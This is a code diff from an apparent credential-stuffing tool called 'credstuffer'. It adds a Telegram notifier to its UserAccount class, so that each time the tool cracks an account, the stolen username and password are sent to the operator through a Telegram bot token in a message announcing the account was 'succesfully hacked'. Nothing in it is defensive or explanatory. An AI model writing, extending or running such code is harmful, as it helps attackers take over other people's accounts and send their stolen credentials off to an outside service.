@@ -3,7 +3,7 @@ from abc import abstractmethod
 from time import sleep
 
 from credstuffer import Account
-from credstuffer.notification import Mail, Telegram
+from credstuffer.notification import Mail, CredstufferTelegram
 
 
 class UserAccount(Account):
@@ -14,7 +14,7 @@ class UserAccount(Account):
             useracc.send_notification(username="abc", password="test")
     """
 
-    def __init__(self, name=None, notify=None, **kwargs):
+    def __init__(self, name=None, notify=None, token=None, **kwargs):
         self.logger = logging.getLogger('credstuffer')
         self.logger.info('create class UserAccount')
 
@@ -26,6 +26,7 @@ class UserAccount(Account):
 
         self.credential_file = self.filename + self.name
         self.mail = None
+        self.credstuffer_telegram = None
 
         if self.notify is not None:
             if 'mail' in self.notify:
@@ -38,6 +39,10 @@ class UserAccount(Account):
                     self.password = kwargs.get('password')
                     self.receiver = kwargs.get('receiver')
                     self.mail = Mail(smtp_server=kwargs.get('smtp'), port=kwargs.get('port'))
+            if 'telegram' in self.notify:
+                if token is not None:
+                    self.token = token
+                    self.credstuffer_telegram = CredstufferTelegram(token=self.token)
         else:
             self.logger.info("No credential notification configured")
 
@@ -95,4 +100,8 @@ class UserAccount(Account):
             self.mail.set_body(mail_content)
             self.logger.info("send credential mail: {}".format(mail_content))
             self.mail.send(username=self.sender, password=self.password, receiver=self.receiver)
-            sleep(5)
+
+        if self.credstuffer_telegram is not None:
+            msg_content = "CREDSTUFFER has succesfully hacked credential from account {}\n\nUsername: *{}*\nPassword: *{}*"\
+                           .format(self.name, username, password)
+            self.credstuffer_telegram.new_msg(text=msg_content)
